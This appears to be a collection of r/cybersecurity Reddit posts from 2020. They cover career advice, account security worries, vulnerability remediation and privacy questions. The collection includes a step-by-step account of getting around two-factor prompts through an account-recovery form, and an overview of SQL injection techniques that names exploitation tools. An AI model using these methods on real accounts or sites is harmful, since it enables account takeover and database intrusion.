I pretended to be someone else trying to get into the account because i am very security conscious. I clicked that i had forgot my password. then it asked for authenticator code, i clicked i dont have this, it then asked if i had access to the recovery email i clicked no. It then asked if i had an account recovery code i clicked I dont have this At this point it asked for an alternate email it can send a code to to regain access to the account through a recovery form. Surely this is a huge vulnerability, why does it let someone simply clicking I Dont have this for literally every security option. Whats the point of 2FA and recovery emails if an attacker can simply have a code sent to any email address they control and fill in a few security questions such as name, date of birth, password. Many hackers already have access to passwords and by doing the above they could bypass 2FA. Also if the attacker is close to the victim they could know xbox details or even email headers. This is a huge vulnerability and i have been discussing it with others in the cyber security threads. Is there some sort of process or other hurdle i am missing here? Because it would seem that it would be much easier for a hacker to get info required for a recovery form than it would be to hack a 2FA protected account. They can simple click I Dont have this for every possible security step and have a recovery form sent to an email of their choice AND the victims account isnt even notified to this. Is there something im missing here?"

Then anyone can doublecheck their entry in the ledger, to ensure it matches what they put in. Further everyone could tally votes, doublechecking accuracy. This seems like it would be the most secure/open voting method possible, and would expose most types of voter fraud to every eye that cares to look for it. You would continue needing a solid voter ID vetting process. Thus preventing anyone from double registering or other types of physical fraud. But paper ballots already have this vulnerability. In an electronic system you would basically just add one hoop, before registering a citizen would generate a public/private key similar to creating a bitcoin wallet. Upon registration they share the public key. Government won't accept an e-vote unless signed with the private key, which of course government can verify using the public one. If portions of the voter ID database are made public, such as the valid public keys, it would again make it insanely difficult to do any tampering with due to all the eyes looking on. Especially if voter registration was mandatory and had to align with a government issued ID. Even people who didn't vote, could easily double-check that their voter ID wasn't misused. Since everything is publicly verifiable after the fact, from a variety of computers, it would be nearly impossible to hack. You'd have to hack all computers and their various architectures simultaneously, and hope no one manually inspecting the ledger's bits notices something untoward. Obviously, this very simple implementation would not allow anonymous voting preferences. But, this is purposefully simple. Using two equal length ledgers it's not overly difficult to conjure a method for storing who voted, and separately saying how they voted. You needn't keep any publicly reversible link between the two. Rather the only reference associating the two is readable by the person with the private key. Only they could verify the entry resulted from their private key. You could even add some magic to this, and allow them to prove their voter ID is associated with the vote entry, if they wished to deanonymize themselves.

The problem is that I'm not knowledgeable about how to properly ""sandbox"" execution in the client, e.g. how can I prevent nodes from being damaged from malicious data? According to my current guesses, there could be vulnerability issues whenever some file is opened or executed. Note: this doubt is not about hash comparison between the main node and its peers, it's more specifically about the contents of the file itself. I've taken a look at the wiki but didn't find anything specifically related to this. Tried to Google it, but no luck there either. For context, I'm a professional programmer.

25,vulnerability,cybersecurity,So you are interested in getting into cyber security?,1,hqsadc,https://www.reddit.com/r/cybersecurity/comments/hqsadc/so_you_are_interested_in_getting_into_cyber/,2020-07-14 11:30:37,"**What you need to know** I see a lot of posts coming through here as of late asking some variant of the question: How do I get into cyber security? So I figured I would make this post and hopefully a few people find this information helpful. **My background:** I've been in the IT industry for almost 10 years now. Two in the cybersecurity sector. I have a B.S in Information Technology as well as a handful of certifications. I'm lead Cybersecurity Analyst at a MSP. I perform duties such as vulnerability scanning, penetration testing, research and development, SOC/SIEM analysis, incident response, digital forensics, I also work closely with other departments in my organization providing various bits of consulting. In addition to my daily duties, I'm an technical escalation point for the systems engineers, create SOPs and training references, assist in onboarding assessments of new customers and more. **How to get into cybersecurity:** Cybersecurity usually requires a vast amount of knowledge which is typically obtainable after a handful of years of experience. When entering cybersecurity, one should have a firm understanding of the following concepts: Networking (tcp/ip stack, protocols, vlans, subnetting, various vpn technologies, ip tables and access control lists, wireless technologies, DHCP, DNS, DNSSEC, routing, packet analysis), networking equipment(firewalls, layer 2 and layer 3 switches, repeaters, bridges, intrusion detection/prevention systems), programming (c, c++, python, java script, SQL, rust), scripting (powershell, bash), servers (domain controllers, DNS servers, application servers, file servers, proxy servers, web servers, email servers, virtualization, load balancing), become familiar with various operating systems (linux, mac, windows (domain vs workgroup setups), how anti virus applications function, Common Attack vectors and how to prevent them, fuzzing applications, incident response (and local laws and regulations regarding incident response), Network scanning, shells/ reverse shells, buffer overflow basics, passive and active information gathering techniques, email header analysis, cryptography and hash functions, cloud environments (Citrix, Azure, O365) and the ability to troubleshoot anything that goes wrong with the above mentioned technologies and finally.... soft skills. Soft skills are just as important as the technical ones. You need to be able to convince an irrational organization to upgrade their 200 windows xp machines when ""they work just fine"", or accurately and clearly explain to the customer how they essentially have been paying a hacker to enter their pc once a month to steal their data or bring calm an organization after an actual data breach and speak with the confidence necessary that the customer believes you when you tell them that you have removed all threats and they are currently secure. You need to be able to explain all of your ideas, concerns and findings to not only the CEO of an organization who's never touched a computer in their life as well as your superior who has more technical knowledge then you could ever hope to attain. **Getting into cybersecurity:** The most common way to get into cybersecurity is to start off in an entry level IT position such as help desk, desktop support or some other related role. Having any type of technical bachelor's degree will be very useful here. Take advantage of these jobs as there are a lot of skills to master (see the above list). Always take the intuitive, always try to work on issues that are just a little beyond your knowledge. You will work your way up ladder, obtain raises and promotions. Continue to educate yourself beyond what you learn only at work. Complete certifications (hopefully your organization will pay for these), perform home labs, and read. Strive to be the person in the room that everyone looks to for answers. Eventually you will have obtained the level of knowledge required to be successful in cybersecurity (you will also realize how much more you have to learn to be great). Please note, for all of the skills listed above. You dont necessarily have to have every single skill fully mastered. But you need to be well versed. I would say if your fully competent in about 75 percent ish of the items listed, you could probably start looking for a cyber security position. With that said, help desk is obviously not the only method for getting into cybersecurity. It's just the most common for most people. The other method would be obtaining proficiency in these areas prior to getting any type of IT job, but the amount of resources and time needed to obtain this level of knowledge before you have to start living on your own (and earn a living) is not feasible for most people. Although true entry level (not requiring the above listed skill sets) cybersecurity positions do exist, not only are they very difficult to come by, but the job duties will likely be similar to a generic entry level analyst position where you scan hundreds of logs a day looking for one or two specific anomalies. Further, a position like this will be on the lower wage scale - 30k to 40k a year. There is an inherent level of liability that comes with an organization attempting to approach cybersecurity the right way. And unfortunately that does not typically favor hiring people with little to no experience or knowledge. Hiring an individual who cant recognize the significance (or the lack thereof depending) of a malformed kerberos ticket during an investigation could be the difference in determining if there is a malicious actor on a network (I know that's bit of an extreme example, but hopefully you get my point). **Exceptions:** I am well aware that there are exceptions to every rule. And I'm sure there are plenty of people who managed to get into the technical realm of cybersecurity that broke every principle outlined above. That's awesome and you should share your stories. But again, this post covers the most common method for most people attempting to enter this industry. Please feel free to follow up with any questions."

I am going to keep this anonymized as possible since it's still ongoing but I was doing some work at my internship (I'm a Veteran with 15+ years of Net/Sys/Cyber experience) and after disconnecting from my VPN I realized I was able to ping/port scan/nmap another private subnet from my home network without being connected to a VPN. I restarted my computer and router several times to see if it was a fluke and contacted my colleagues to see if they owned any of the subnets and low and behold none of them said it was them. I contacted my ISP and on the first call they hung up on me. The second call resulted in being transferred to the security department. Three and a half hours later after e-mail documentation of NMAP/IP Scan/misc logs and I am still able to ping the private network across the internet. They are a major ISP and I have contacted their Security team as well as their social media team. Not sure where to go next but obviously the vulnerability is still exposed. I am being ambiguous out of caution but I don't know how to contact anyone higher or if I will even be able to find out the cause of a private subnet leaking out to the public internet. This seems ridiculous for such a large company and I'm dismayed that the first person I contacted straight up hung up on me. Thoughts?"

31,vulnerability,cybersecurity,Sub Update,1,hyjn7b,https://www.reddit.com/r/cybersecurity/comments/hyjn7b/sub_update/,2020-07-27 12:10:47,"Hi all, We're taking this opportunity to publish a quick Subreddit update. /u/HeyGuyGuyGuy has done outstanding work these last few months keeping the education resources thread up to date. We've invited him to join us as a Moderator, and also created a new space for the work he's been putting together. There is a new Wiki Page to maintain a full list of resources that are available, as well as we will be adding a Calendar to the sidebar so you can see what events are coming up. Alongside the 'Upcoming CyberSecurity Events' wiki page we're hoping to add two others, 'How do I get into CyberSecurity' and a general FAQ. We're asking for submissions from the community for both of these pages. The new education page of the wiki can be found here: URL There is also going to be some changes to allowed content. Firstly, we will be removing the ability to post images. Memes/Funny Images/Screenshots of bad recruitment requirements/etc don't have a place here. We are unsure on how to proceed with the 'Have I been Hacked/Do I have Malware' type posts, and would like your feedback. Should we allow these posts in this subreddit? Finally, we will be taking action against newsbots that spam the subreddit. Anyone who regularly posts link content to external news sites / youtube / etc will be requested to restrict their posting to one post every two days. Sometimes some of these articles are interesting, and over time some of them have been significantly upvoted, however we don't want the sub to just devolve into a news aggregation service. Additionally, any post by a organisation where there is some kind of ad to the organisations services within (even if it's a mostly educational blog) will be required to flair their post with ""CORPORATE BLOG"" as a disclaimer. Whenever there is a significant security incident or event (Windows DNS Vuln or Twitter Hack) there is always a rash of threads that pop up with news articles about it. It's sort of an unwritten policy, here and in other subreddits, that generally it's best to only have one thread active about a significant event at a time. After some messages that have come through, I'm now writing it down. Whenever there is a significant security event, please look through the sub and if there is already a thread post whatever you were going to post to the comments of that thread. Rather than having five or six different threads about the same event, it's best to only have the one thread in order to collect discussion all in one place. Any posts on the same news topic in the same 24 hour period will be removed and redirected to the existing thread. Whenever there is a serious incident or vulnerability we will either create a megathread or a relevant flair to collect all discussion under one heading. For a moment there were regular 'Mentorship' threads. Unfortunately AutoMod is causing problems across Reddit with it's scheduler. I'm going to manually be adding these threads semi-regularly until we can sort it out. I hope that the Reddit chatroom that we will be opening can assist here - new or old to CyberSecurty, please check out the Security Development Group under chatrooms in the sidebar. Summary of Rule Changes: * 1 [UPDATED] - No Low Effort / Poor Quality Posts. Memes / Screenshots of 'security fails' / etc are covered under this rule. * 6 [UPDATED] - NO ADVERTISING. Accounts that regularly post only links to external content are requested to limit their posting to once every two days, at risk of ban. Additionally, educational articles or blogs which contain advertisement for a service within are to flair their posts with ""CORPORATE BLOG"" * 8 [NEW] - Threads about ongoing security incidents may be removed and redirected to a main thread to collect discussion in one place. Summary of what we need from you: * Any submission for 'How do I get into CyberSecurity' or 'FAQ'. * Should 'Have I been Hacked/Do I have Malware' posts be allowed. Theres a handy submission form here: URL Finally, I'm going to close with a few requests. Firstly, that everyone please be mindful of the community. Be the better person, if someone insults you just report them - don't get into a flame war. If you do, we will have to graveyard the thread and temp ban you both. Secondly, please use the report function if you see submissions that arent relevant to the community. You help us make this a better place."

On a website I host I had one user who had an injection of an adware popunder script. This wasn't server side, and I couldn't see the injected script in my browser. The script was highly obfuscated, and basically had a setTimeout of a random period then injected a transparent full screen iframe with url to a malicious site. What I'm particularly interested in is the attack vector. This wasn't a reflected attack as I understand it, since the request was for the root of the site with no params posted (ie simple get request), and it's not stored otherwise I'd also see it. So how is the script html being injected - I need to understand this so that I can close off the vulnerability one way or another, but my Google-fu is proving weak on this topic and I need some pointers. The site is a Wordpress one pager - nothing fancy. I'm not really interested in a debate on how good or bad one cms framework is over another, just to understand purely what the attack is and how to defend against it."

F5 released the patch June 30. Much like Apache Struts (led to Equifax mega-breach), this F5 issue has all the hallmarks of an impending major cyber incident (I hope not). 30 days is easy to patch for home devices, but large enterprises always have to struggle with downtime, change control, communication, and resources to commit to doing the action. For an issue like this, its frustrating that the urgency and criticality of applying these patches cannot be better conveyed holistically to enterprises (the business side). I'm certain some orgs are applying, but the fact that CISA is issuing a notification on it being a major issue, urging orgs to patch or at minimum put in (SNORT) IDS rules to detect compromise shows its an issue. This issue does not affect me professionally, but as I'm seeing the alerts and news day after day, it just 'feels' like the Apache Struts or the SMBv1 (Eternal Blue) CVE-2017-0144 one when WannaCry ripped up the EU back in 2017 months after the patch was released by MSFT. **What effective ways have you been able to improve/facilitate/champion vulnerability management in your experience?** \-Gerry &amp;#x200B; \[1\][URL \[2\] [URL \[3\] [URL"

I immediately called my bank, logged in online, and changed my username and password at their recommendation. Originally they told me they saw no record of the strange login. A day later they came back and said the login came from a company called Linode. Im at a bit of a loss for what else I should do, if anything. This has happened once before. Last time, I just set a new password for my bank account and my associated email address. That was maybe 6 months ago. Possible relevant information: I only ever log in to my bank account on two devices - an iPad and iPhone. I have fairly minimal apps which I recently culled and feel pretty certain those are all safe. I do use LastPass as a password manager. My bank password is randomly generated through lastpass and unique from any other passwords. I cant really figure out what Linode has to do with this and where any potential vulnerability is.

Things they told me to review were very broad subjects and not specific technologies. responsibilities include: * Information Security Analyst * Risk and Vulnerability Management * Incident Response Management * Cyber Engineering Subjects I was told to review: * NIST framework * ""FCC regulations for telecoms"" and Cyber Security compliance with those regulations * SharePoint/365 interoperability After searching online there seems to be TONS of documentation for all of these and I'm feeling overwhelmed. I have no idea where to even start, much less what is relevant or useful to my position. I was told that I'll have opportunities to work with PenTest teams and I'll be allowed to pivot if I prefer their work, so I'd love to be prepared to understand what they're doing as well. I'm a little worried that my current position won't get to actually work with code in any capacity and I'll just be using tools to track and manage issues, so I'd hope PenTesting will allow me to play with code more. If I want to actually code, is Security the wrong specialization for me?

What I'm looking for: Vulnerabilities that are seen commonly in real-world production environments. Misconfigurations or bugs in common programs / operating systems. I want to simulate something realistic -- not too vulnerable yet still vulnerable enough to exploit and learn something. That's not necessarily to say that Remote Code Exec and Priv Esc are unwanted; I just want to limit the number of those kinds of vulns to make my attack paths more interesting. In other words, what general kinds of exploits or programs (OpenSMTPD, PHP stuff, etc.) that have historically been pretty vulnerable are there that I can install / configure onto my vulnerability lab and play around with? If applicable, a corresponding CVE would be really helpful too. Shoot me with your recommendations. Thanks all!"

I am supposed to remediate these vulnerabilites. The problem is, I don't totally understand what these vulnerabilities means, or what they are referring to. I hope the gurus here can shed some light. 1. Disable SSL/TLS: Certificate Signed Using A Weak Signature Algorithm The remote service is using a SSL/TLS certificate in the certificate chain that has been signed using a cryptographically weak hashing algorithm. Servers that use SSL/TLS certificates signed with a weak SHA-1, MD5, MD4 or MD2 hashing algorithm will need to obtain new SHA-2 signed SSL/TLS certificates to avoid web browser SSL/TLS certificate warnings. Node involves DC, Exchange servers 2. Disable SSL/TLS: Diffie-Hellman Key Exchange Insufficient DH Group Strength Vulnerability The SSL/TLS service uses Diffie-Hellman groups with insufficient strength (key size &lt; 2048). Deploy (Ephemeral) Elliptic-Curve Diffie-Hellman (ECDHE) or use a 2048-bit or stronger Diffie-Hellman group (see the references). I can't remember what the affected node is right now. 3. Disable SSL/TLS: Report Vulnerable Cipher Suites for HTTPS This routine reports all SSL/TLS cipher suites accepted by a service where attack vectors exists only on HTTPS services. The configuration of this services should be changed so that it does not accept the listed cipher suites anymore. Please see the references for more resources supporting you with this task. Affected node is VPN appliances 4. Disable SSL/TLS: Report Weak Cipher Suites This routine reports all Weak SSL/TLS cipher suites accepted by a service. NOTE: No severity for SMTP services with 'Opportunistic TLS' and weak cipher suites on port 25/tcp is reported. If too strong cipher suites are configured for this service the alternative would be to fall back to an even more insecure cleartext communication. The configuration of this services should be changed so that it does not accept the listed weak cipher suites anymore. Please see the references for more resources supporting you with this task. Affected node is DC 5. Disable: SSL Certificate Signed Using Weak Hashing Algorithm The remote service uses an SSL certificate chain that has been signed using a cryptographically weak hashing algorithm (e.g. MD2, MD4, MD5, or SHA1). These signature algorithms are known to be vulnerable to collision attacks. An attacker can exploit this to generate another certificate with the same digital signature, allowing an attacker to masquerade as the affected service. Note that this plugin reports all SSL certificate chains signed with SHA-1 that expire after January 1, 2017 as vulnerable. This is in accordance with Google's gradual sunsetting of the SHA-1 cryptographic hash algorithm. Note that certificates in the chain that are contained in the Nessus CA database (known\_CA.inc) have been ignored. Contact the Certificate Authority to have the SSL certificate reissued. Affected nodes are DC, exchange. &amp;#x200B; Sincerely appreciate any comment, suggestion, explanation to me."

I'm an IT student and I have a project about Advanced Persistent Threats. My question is what are the phases or stages of an APT attack? I searched in many books and other sources but each one had different stages, although similar they were. Specifically, I found in a book that there are 5 stages: 1. Reconnaissance. 2. Scanning. 3. Exploitation. 4. Create backdoors. 5. Cover their tracks. In a Symantec white paper it said that there are 4 phases: incursion-&gt;discovery-&gt;capture-&gt;exfiltration. On a fireeye article it states 6 steps: 1. The cyber criminal, or threat actor, gains entry through an email, network, file, or application vulnerability and inserts malware into an organization's network. The network is considered compromised, but not breached. 2. The advanced malware probes for additional network access and vulnerabilities or communicates with command-and-control (CnC) servers to receive additional instructions and/or malicious code. 3. The malware typically establishes additional points of compromise to ensure that the cyber attack can continue if one point is closed. 4. Once a threat actor determines that they have established reliable network access, they gather target data, such as account names and passwords. Even though passwords are often encrypted, encryption can be cracked. Once that happens, the threat actor can identify and access data. 5. The malware collects data on a staging server, then exfiltrates the data off the network and under the full control of the threat actor. At this point, the network is considered breached. 6. Evidence of the APT attack is removed, but the network remains compromised. The cyber criminal can return at any time to continue the data breach. Could you help me determine which of the above is the correct one?"

What about you?",1,gkvg8r,https://www.reddit.com/r/cybersecurity/comments/gkvg8r/hash_client_and_then_server_too_for/,2020-05-17 00:24:10,"This may be an unusual scenario, and I would like some feedback. One of the most usual practices, as I understand it, is to salt user's password hashes uniquely and with a reasonably complex bcrypt server-side, and then store it on a big user-auth table on the server. We bcrypt incase the user-auth table is leaked, because then the person who obtains it needs to compute every attempt and then see if the hash matches before knowing if that will gain them entry. This is still prone to weak/re-used passwords, but for complex and uniquely made ones it could render it essentially impossible to figure out the typed password. However, this doesn't stop server-farms from instead just throwing the login attempt at the auth server itself, to check if the password matches. If they don't have access to the user-auth table, then this is the only way to really gain access, just to try and try. And this takes no computing power, as they are just sending a raw password. If, theoretically, the password was bcrypted with client-side javascript first (and with unique hash), and then sent over to act as the 'raw password', and then hashed again on the server... Wouldn't that slow these attempts down majorly? They would need to do computing work to attempt to gain access even without the auth-table. It also gives the benefit of the server not ever knowing the actual password used, so there's no potential for it to be leaked through logs or other mishaps. Even if my auth server was compromised, as long as on the client-side everything is still bcrypting before being sent, then there's still no way to obtain what the user has actually typed as the password. And that's important with the impossibility of stopping users from re-using their passwords on other online accounts. Besides it requiring javascript enabled, am I correct to think this would be a nice bit of additional security? If the site itself already needs javascript to function, then that vulnerability is there anyway. Furthermore... If the server side always knows it is getting a complex bcrypt hash with 53 unique characters that each could be 64 possibilities, then doesn't it make it redundant to use bcrypt server side as well? i.e. isn't it generally easier to crack a user-entered password that has been bcrypted, than a 64^53 essentially random combination of characters that is SHA256'd? SHA256 may be fast, but since a 53-long hash is the mandatory input, the time it would take to brute-force the original bcrypt hash would be astronomical, and then you're still left with something (a bcrypt hash) that can only logon to this one website and 0% chance this bcrypt hash has been re-used elsewhere, unlike weak passwords that are brute-forced. They would then need to repeat the process like they would do if the typed password had only been bcrypted server side. The benefit of using SHA256 server-side, being, it is fast as hell for the server to compute, which means we can up the complexity of the client side bcrypt quite considerably to the point where it could take e.g. 4 seconds for a modern cpu to compute. If we used that kind of bcrypt complexity for the auth-server then I imagine it would slow to a crawl serving so many users at once. Upping the complexity of this bcrypt is kind of the last measure we can take to secure users who use weak passwords before employing 2FA, right? So putting that burden on each user's device sounds like the best possible way of doing that. Anything to poke holes in? Unrelated but I went kind of HAM on making the logged in JWT's exist in https-only cookies only, so javascript wouldn't have access. This is good for keeping it away from javascript attacks, but, it also means every request will just send that JWT over automatically, right?, rather than dynamically picking the circumstance with javascript. Is that an okay compromise to make?"

If I were to use a very basic simple python-based executable which takes in a string, and performs key-derivation operation (argon2/pbkdf2/scrypt with recommended parameters), with me feeding one master password concatenated with the website name to it every time I want to know the password to login, would that not be more secure than the manager? There are no passwords stored, the script is exceedingly simple in comparison, no internet access (for syncing) needed, and no need to ensure a good encryption implementation. Is my reasoning correct or are there more security features provided by the password manager models in comparison to a simplistic key derivation (maybe using salt, if it helps significantly, or protection against memory scraping programs)?"

So I'm a fairly new Airman and I'm extremely interested on how our military sets extreme restrictions via windows upon login. You must use your CAC to access the computer. The reason why I'm asking about this is because I have a personal laptop that I'll use for gaming and personal use, BUT if I wanted to access my military information through the different domains websites they have us access, I wanted to do so in a manner similar to what the military does so I can have safe practice of preventing anybody from stealing my personal information. If I made separate windows user login on my PC that had strict firewall restrictions and if I had something malicious that I don't know of on my personal windows user login, could still affect my vulnerability regardless? I'm assuming there's some sort of virtual network assigned for each time we create a session at a computer. And I believe a server recognizes our CAC to let us log in. In the end, is there any way I can create some sort of extra safety login specifically for my CAC access that has nothing to do with my personal login?"

I'm looking for secure ways to remote access my desktop computer outside of my home network, preferably through a terminal because I've used RDP and VNC software in the past and always found having the full GUI be too slow to be pleasant to use. My goal is to essentially mimic how I would connect to a company VPN network and SSH into a compute node, as that's what I intend to use my desktop for. Both the client and server will be running Ubuntu. I've been looking around for options and the only things that I've really come across are: * Use a prepackaged RDP/VNC software (I was specifically going to try out Remmina) * Set up port forwarding on my router to open up my machine to the world * Setup a VPN (either manually, using the router's built in functionality, or via something like Hamachi) The port forwarding option scares me because I definitely don't have the experience to make sure I don't leave my home network open to attackers, and as far as I understand, setting up a VPN involves similar risks. I'm guessing using a router's built in VPN functionality basically hands off all security responsibility to my router, which seems unwise based on all the posts I read around here of yet ANOTHER known vulnerability that hasn't been patched for years. Another idea was to use something like Hamachi to handle the VPN side of things and then setup an SSH server on my desktop and access it that way, but I'm not really sure if this is any better than the previous options. So with the use cases and security concerns in mind, do people have any insight or suggestions on what might be the best approach to this? I would say I'm security conscious user, but I don't have any experience with setting up any secure infrastructure. I'm not afraid to get my hands dirty with things like port forwarding, I just expected it to be a can of worms that is better left untouched without the proper experience. Thanks!"

Understand the difference between a vulnerability and a threat, and how to tell the story behind your org's risk posture. Influence people to make the right decisions because they want to, not because you're ""teh cyberz.""

Automated tools are an incredibly valuable way of testing for vulnerabilities, and when used effectively can help developers patch quickly and effectively. Relying purely on an automated tool for a vulnerability report wouldn't be my choice of submitting a report, Nash told The Daily Swig. If they went through and looked and confirmed all 5,000 vulnerabilities then my hat goes off to them, otherwise, I suspect there is a high level of false positives. It looks they are talking about 1,775 plugins with over 5,000 vulnerabilities, so I suspect again due to the automated nature they are probably hitting the same vulnerability and classifying it as new vulnerability each time it's referenced, he added. Despite these misgivings, Nash clarified that he felt the research was nonetheless worthwhile. None of that is to take away from the achievements, or the research done  they found potential vulnerabilities in 2% of plugins in the repository, Nash, an active member of both the WordPress and infosec communities, noted. We asked Garcia to confirm that the WordPress vulnerabilities discovered had been manually verified. Garcia responded: We have verified some manually and would say that most of them are vulnerable. We have not included functions that escape special characters We have only identified vulnerable plugins where the parameters are not validated. We know that maybe there are false positives, but we do not include as vulnerabilities code lines with validating functions like esc\_sql() or htmlspecialshars(), so we no that there are more than 5,000 POTENTIAL vulnerabilities, but the main thing is that the developers don't validate the SQL injections. ### RootedCON The two Spanish researchers presented their findings at the [RootedCON cybersecurity congress](URL in Madrid last weekend.

I never saved or wrote its master password anywhere and my internet connected devices are my iPhone 6s and a Windows computer with Malwarebytes and windows defender. No one have physical access to my iPhone or PC. Today I received an email from lastpass that supposedly I want to disable multi factor authentication!! I was so puzzled that what the h* is this? Long story short, after contacting lastpass support, they confirm that someone very likely had my master password so he could reach the multi factor authentication step and there he was trying to disable it to gain access. There is no failed access in the lastpass login history and lastpass support confirms that its possible under some situations failed logins can be missing. For past few hours I was thinking that how possible is my master password to be hacked? I never wrote it anywhere and I never entered it in a public computer. I just remembered that a few days ago I decided to save a few of those one time passcodes for lastpass in my iPhone Notes app, for case of emergency. Maybe it seem stupid but my guess is someone somewhere or thru one of the apps in my iPhone could reach those one time passcodes and entered one of them to reach 2fa step without any problem! Probably thats where lastpass support says sometimes failed logins dont get recorded, because they are neither failed nor successful. My question is: - How unsafe is iPhone Notes app? Am I too paranoid about it? - Is there anyway that another app have access to iPhone Notes contents?"

I have been thinking about the possibility of starting a small business in GRC cyber security. Money is not a problem. Where I am located there are no companies that provide these type of compliance services and most are basic network/storage security. I think that compliance is a good niche that not many IT folks are even interested in, but companies direly need. While I was working (government 10+ years) I experienced some of the most ridiculous security risks from both gov and civ counterparts. In my experience, very few people had working and usable knowledge of full spectrum information assurance and security. I have had a few other successful side businesses but this would be the first attempt at an actual full time gig. My exp is: 10+ years IT. Retired mil, 5 years ISSM (gov) foe enterprise env.

126,vulnerability,cybersecurity,SQL Injection Payload List via PayloadBox ,1,f880v8,https://www.reddit.com/r/cybersecurity/comments/f880v8/sql_injection_payload_list_via_payloadbox/,2020-02-23 21:53:57,"In this section, well explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection. ## What is SQL injection (SQLi)? SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the applications content or behavior. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. URL ## SQL Injection Type : * **In-band SQLi (Classic SQLi) :** In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi. * **Error-based SQLi :** Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database. * **Union-based SQLi :** Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response. * **Inferential SQLi (Blind SQLi) :** Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as blind SQL Injection attacks). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web applications response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi. * **Boolean-based (content-based) Blind SQLi :** Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. * **Time-based Blind SQLi :** Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. epending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. * **Out-of-band SQLi :** Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable). * **Voice Based Sql Injection :** It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. ## SQL Injection Vulnerability Scanner Tools : * [SQLMap](URL  Automatic SQL Injection And Database Takeover Tool * [jSQL Injection](URL  Java Tool For Automatic SQL Database Injection * [BBQSQL](URL  A Blind SQL-Injection Exploitation Tool * [NoSQLMap](URL  Automated NoSQL Database Pwnage * [Whitewidow](URL  SQL Vulnerability Scanner * [DSSS](URL  Damn Small SQLi Scanner * [explo](URL  Human And Machine Readable Web Vulnerability Testing Format * [Blind-Sql-Bitshifting](URL  Blind SQL-Injection via Bitshifting * [Leviathan](URL  Wide Range Mass Audit Toolkit * [Blisqy](URL  Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB) Source : [URL"

129,vulnerability,cybersecurity,Becoming a Penetration Tester/Hacker,1,fc2xve,https://www.reddit.com/r/cybersecurity/comments/fc2xve/becoming_a_penetration_testerhacker/,2020-03-02 10:43:32,"So this question is asked quite frequently, and I thought it would make the most sense to explain what you'll need to know to become a hacker in this post. Now, before we get into the technical details, first some background about me. I have a Master of Science in Computer Science with a concentration in Telecommunications and Network Security. I have a Bachelor of Science in Information Technology with a concentration in Computer Forensics and a double minor in Computer Science &amp; Cybersecurity. And I have been a member of a Red Team for the past couple of years. So what are you going to need to know to be a Hacker? Here are the key concepts from the Study Guide that I used to prepare for an exam to get my Red Team Job Here's the list: - Programming/Scripting. You'll need to know basic programming concepts, and how to read and interpret scripts/code. You will need to be familiar with Shell scripting (e.g., cmd, wmic, bash), Interpreted languages (e.g. Python) and how to Interpret source code and scripts (e.g., Flow, variables, loops). You should be pretty familiar with a Scripting and/or programming language. You'll be able to find tons of information online regarding learning how to code. - Computer Architecture &amp; Networking. You'll need to understand the fundamentals and theory behind computer design, computer networking, and basic computing concepts. Some things you should be aware of is, Computer Math numbering systems and conversions, Computer concepts (e.g., CPU architectures, virtualization), Memory organization and layout, Storage concepts (e.g., hard disk drives, solid state drives) and the difference between kernel and user space. A good resource for learning this is [Computer Organization and Design ARM Edition:The Hardware Software Interface](URL - Operating Systems (Windows and Linux/UNIX). You'll need to learn of computer systems administration, software interactions and I/O interactions in either Windows or Unix implementations. Some things you'll need to know are Standard administrative commands, Local system configurations, Data security and integrity protection, Antivirus concepts and file systems. A Great resource for learning Operating System is the book [Operating System Concepts Tenth Edition](URL That website contains tons of useful information for that book including slides and study guides. But as a prerequisite for learning Operating Systems you should already be familiar with basic data structures, computer organization, and a high-level language, such as C or Java. - Network Design. You'll need to be aware of the operations, management, and maintenance of computer networks, protocols and standards and how they integrate with one another. Some things you should be familiar with are IP / subnetting, Ethernet, Routing, Network layout and design (i.e., network typology) and Networking device concepts (e.g., routers, firewalls, intrusion detection systems). There is a great CCNA prep course available [here](URL that you can learn this from. A good book to learn about Networking is [Computer Networking: A Top-Down Approach, By James F. Kurose](URL [This](URL is also a good resource for learning about networks from a security point of view - Networking Applications and Services. You'll need to know Protocols, and ports for standard network services, Network services and ports on standard Windows/Unix installs, Network-related commands and Network service administration and configuration. For this you can use the resources from above. So those are the Fundamentals that you need to know to become a Hacker. Once you have those down, you can move onto learning some more advanced concepts. Some of those concepts would be: - Information security tools and techniques: Network monitoring, Network mapping, Vulnerability scanning, Penetration testing - Offensive information security - Digital forensics and data recovery - Voice/data communications (satellite, RF, wireless, and 